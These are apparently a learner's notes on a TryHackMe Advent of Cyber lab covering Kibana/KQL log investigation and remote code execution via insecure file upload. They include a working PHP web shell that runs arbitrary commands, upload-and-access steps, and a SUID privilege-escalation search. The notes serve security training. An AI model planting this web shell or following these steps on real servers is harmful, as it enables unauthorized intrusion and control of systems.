
# AOC Day 3: Log Analysis using ELK Tools, Introduction to Remote Code Execution

## Learning Objectives
- Understand log analysis and tools like ELK.
- Learn Kibana Query Language (KQL) for log investigation.
- Comprehend Remote Code Execution (RCE) via insecure file upload.

---

## Connecting to the Machine
- Start both the virtual machine (VM) and the AttackBox.
- Use TryHackMe VPN for manual hacking machine connections.

---

## Operation Blue: Investigating the Attack

### Log Analysis with ELK
- **ELK**: Elasticsearch, Logstash, Kibana stack for centralizing and analyzing logs.
- URL to access Kibana: `http://MACHINE_IP:5601`.

### Kibana Discover Interface
- **Steps**:
  1. Open Analytics -> Discover.
  2. Select `wareville-rails` collection.
  3. Adjust the time filter to `October 1, 2024 00:00:00` to `October 1, 2024 23:30:00`.
  4. View logs using the Kibana UI.

### Kibana UI Features
- **Search Bar**: Query logs using KQL.
- **Fields Pane**: Explore parsed log fields (e.g., timestamp, IP).
- **Timeline**: View log event distribution.
- **Log Entries**: Inspect specific logs.
- **Filters**: Narrow logs using `+` or `-` in the fields pane.

### Kibana Query Language (KQL)
- Examples:
  - Search IP: `ip.address: "10.10.10.10"`.
  - Wildcard: `United*` (matches "United Kingdom", "United States").
  - Logical Operators: `AND`, `OR`.
  - Field Search: `clientip: 10.9.98.230`.

### Investigating Web Shell Upload
- Scenario: Web shell uploaded on Oct 1, 2024.
- **Steps**:
  1. Set time filter: `Oct 1, 2024 00:00:00` to `Oct 2, 2024 00:00:00`.
  2. Filter logs for `10.9.98.230`.
  3. Find suspicious requests (`shell.php`).

---

## Operation Red: Exploiting the Attack

### File Upload Vulnerabilities
- **Dangers**:
  - RCE: Executing uploaded scripts on the server.
  - XSS: Injecting malicious HTML.
- **Examples of Exploits**:
  - Uploading scripts for RCE.
  - Exploiting weak credential defaults.

### What is RCE?
- Allows attackers to execute arbitrary code on a server.
- Examples: Exploit file upload to execute shell commands.

### Malicious PHP Script Example
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```

### Steps to Exploit RCE
1. Create `shell.php` with the script above.
2. Upload as a profile picture.
3. Access it via `http://<ip-address>/admin/assets/img/profile/shell.php`.
4. Execute commands via the web shell.

### Useful Commands Post-Exploit
- `ls`: List files.
- `cat`: Read file contents.
- `whoami`: Identify current user.
- `find / -perm -4000`: Find SUID files for privilege escalation.

---

## Practical Instructions
1. **Blue Team Tasks**:
   - Investigate `frostypines-resorts` logs on ELK.
   - Time filter: `October 3, 2024 11:30` to `12:00`.
2. **Red Team Tasks**:
   - Exploit Frosty Pines Resorts via file upload vulnerability.
   - Add `MACHINE_IP frostypines.thm` to `/etc/hosts`.

